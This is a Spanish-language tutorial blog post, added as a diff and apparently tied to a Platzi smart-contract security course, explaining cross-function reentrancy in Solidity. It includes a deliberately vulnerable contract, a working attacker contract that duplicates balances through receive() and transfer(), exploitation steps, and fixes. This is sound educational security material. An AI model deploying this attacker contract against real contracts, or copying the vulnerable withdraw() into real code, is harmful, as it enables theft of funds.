@@ -1,0 +1,161 @@
+---
+title: 'Solidity: Ataque Reentrancy Cruzado'
+description: 'La vulnerabilidad conocida como Reetrancy permite llamar a una misma función una y otra vez. Existe una variante que provoca el llamado a una segunda función. Se lo conoce con el nombre de Reetrancy Cruzado.'
+pubDate: '06/01/2023'
+englishMetadata: {
+  title: 'Solidity: Cross Reentrancy Attack',
+  description: 'The vulnerability known as Reetrancy allows the same function to be called over and over again. There is a variant that causes a second function to be called. It is known by the name of Reetraccy Cruzado.'
+}
+---
+
+# Solidity: Ataque reentrancy cruzado
+
+La vulnerabilidad de los contratos inteligentes conocida como **Reetrancy** no solo permite llamar a una misma función una y otra vez. Existe una variante similar, pero que **provoca el llamado a una segunda función**. Se lo conoce con el nombre de **Reetrancy Cruzado**.
+
+## Reentrada cruzada de transacciones
+
+Para que este tipo de vulnerabilidad se exponga, el contrato atacado tener una segunda función que permita manipular ETH de forma no contemplada por la regla de negocio principal del mismo.
+
+Veamos de qué se trata esta vulnerabilidad y cómo prevenirla a través de un simple ejemplo:
+
+### Explicación del contrato vulnerado
+
+Utilizaremos de ejemplo un contrato inteligente que permite depositar, retirar y transferir ETH a un tercero. Cada dirección solo puede retirar sus propios fondos o transferirlos a otra cuenta, pero **la vulnerabilidad permitirá que un atacante duplique sus fondos en otra cuenta** para que esta también pueda hacer retiros de ETH que no le corresponden.
+
+### Contratos involucrados
+
+Comencemos con el contrato principal que contiene la lógica de negocios para el depósito, retiro y transferencia de Ether.
+
+```js
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity >=0.7.0 <0.9.0;
+
+contract ReentrancyCross {
+  mapping (address => uint) private balances;
+
+  // Función para depositar ETH
+  function deposit() public payable {
+    balances[msg.sender] += msg.value;
+  }
+
+  // Función para retirar todo el ETH de una cuenta
+  function withdraw() public {
+    uint amount = balances[msg.sender];
+    (bool result, ) = msg.sender.call{value: amount}("");
+    require(result);
+    balances[msg.sender] = 0;
+  }
+
+  // Función para enviar ETH de una cuenta a otra, la vulnerabilidad la utiliza para duplicar balances
+  function transfer(address to, uint amount) public {
+    if (balances[msg.sender] >= amount) {
+      balances[to] += amount;
+      balances[msg.sender] -= amount;
+    }
+  }
+
+  // Función para ver el balance de una cuenta
+  function getBalance(address addr) public view returns (uint) {
+    return balances[addr];
+  }
+
+  // Función para ver el balance total del contrato
+  function getTotalBalance() public view returns (uint) {
+    return address(this).balance;
+  }
+}
+```
+
+Por su parte, el contrato atacante:
+
+```js
+contract Ataque {
+  // Dirección del owner de contrato donde se duplicará el balance
+  address payable ownerAddr;
+
+  ReentrancyCross public reentrancyCross;
+
+  constructor(address _reentrancyCrossAddress) {
+    // Instanciamos el contrato ReentrancyCross
+    reentrancyCross = ReentrancyCross(_reentrancyCrossAddress);
+    ownerAddr = payable(msg.sender);
+  }
+
+  // Función que recibe los ETH luego de un retiro
+  receive() external payable {
+    // Llamando a transfer(), duplicamos el balance en la cuenta del atacante
+    reentrancyCross.transfer(ownerAddr, msg.value);
+  }
+
+  // Función que ocasiona el llamado a una segunda función luego del retiro
+  function attack() external payable {
+    require(msg.value >= 1 ether);
+    reentrancyCross.deposit{value: 1 ether}();
+    reentrancyCross.withdraw();
+  }
+
+  // Función para ver el balance total del contrato luego de explotar la vulnerabilidad
+  function getTotalBalance() public view returns (uint) {
+    return address(this).balance;
+  }
+}
+```
+
+### Procedimiento para vulnerar el contrato
+
+* 1. Desplegar el contrato `ReentrancyCross`.
+* 2. Depositar 1 ETH con dos cuentas. Hasta este punto, el contrato tendría 2 ETH.
+* 3. Desplegar contrato `Attack` que recibe en el constructor la dirección de `ReentrancyCross`.
+* 4. Hacer el llamado a `Attack.attack` enviando 1 ETH con una tercera cuenta para tener acceso a realizar una extracción. El contrato atacante recuperará inmediatamente ese ETH mientras que también provocará que el balance se duplique en otra dirección para que esta pueda retirar un ETH que no le pertenece.
+
+### ¿Qué sucedió aquí?
+
+`Attack` depositó un ETH e inmediatamente lo retiró con `ReentrancyCross.withdraw` que realiza una `call()` al propio contrato atacante. El contrato atacante recibe ese llamado en `receive()`, guarda el ETH, y ejecuta la función `transfer()` del contrato vulnerado. Dicha función, provoca que el balance del contrato atacante sea transferido a otra dirección. En este ejemplo, se utiliza la dirección que desplegó el contrato `Attack`.
+
+De esta manera, el owner que desplegó el contrato `Attack`, tendrá en su balance personal de `ReentrancyCross` 1 ETH que no le pertenece y que puede retirar sin problemas.
+
+Habiéndose duplicado el balance, el owner de `Attack` se queda con 1 ETH mientras que el propio contrato `Attack` posee el otro ETH fácilmente retirable por parte del owner.
+
+La vulnerabilidad del tipo **Reetrancy Cruzado** es más discreta, ya que esta no vacia por completo los fondos de una contrato como **Reetrancy**, permite realizar pequeños retiros tal vez insospechados si el contrato tiene miles de ETH.
+
+### ¿Por qué sucedió?
+
+Al realizarse la transferencia antes de que el balance del contrato atacante se ponga en 0, permite hacer una transferencia de este balance a otra cuenta. Observa que el balance de la cuenta del contrato atacante se setea a 0 recién en la última línea de código de la función `withdraw()`.
+
+```js
+function withdraw() public {
+  uint amount = balances[msg.sender];
+  (bool result, ) = msg.sender.call{value: amount}("");
+  require(result);
+  balances[msg.sender] = 0;
+}
+```
+Exactamente, el mismo problema de **Reetrancy**, al no setear el balance a 0 en el momento correcto, permite realizar una transferencia del balance a otra cuenta.
+
+### ¿Cómo se puede evitar?
+
+Veremos dos medidas que puedes tomar para evitar este enorme problema de seguridad.
+
+1. El primero es **mover el seteo del balance a 0 antes del llamado a la función externa**.
+```js
+function withdraw() public {
+  uint amount = balances[msg.sender];
+  balances[msg.sender] = 0;
+  (bool result, ) = msg.sender.call{value: amount}("");
+  require(result);
+}
+```
+Corresponde setear a 0 el balance de la cuenta que retira sus fondos antes de realizar el llamado externo. En el caso de que el llamado falle por otro motivo, no te preocupes, ya que el `require()` hará un `revert()` y los balances volverán a como estaban antes del fallo.
+
+2. También puedes **setear el uso del gas en la llamada externa**.
+```js
+(bool sent, ) = msg.sender.call{value: monto, gas: 10000}("");
+```
+Siempre es aconsejable configurar el gas disponible para un llamado externo
+
+## Conclusiones
+
+Hemos visto hasta aquí que el depósito, retiro o transferencia de valor entre cuentas o contratos **es un tema que no debe tomarse a la ligera**. Muchas variables que pueden escaparse y provocar desastres económicos, como muchos que ya han sucedido en la industria. Como desarrolladores Web3, **tenemos la responsabilidad de cuidar el ecosistema y que sea un lugar confiable para depositar nuestro dinero**.
+
+---
+Post creado en colaboración con el [Curso de Introducción a Seguridad de Smart Contracts](https://platzi.com/clases/2721-seguridad-smart-contracts/45718-denegacion-por-reversion/) de **Platzi**.
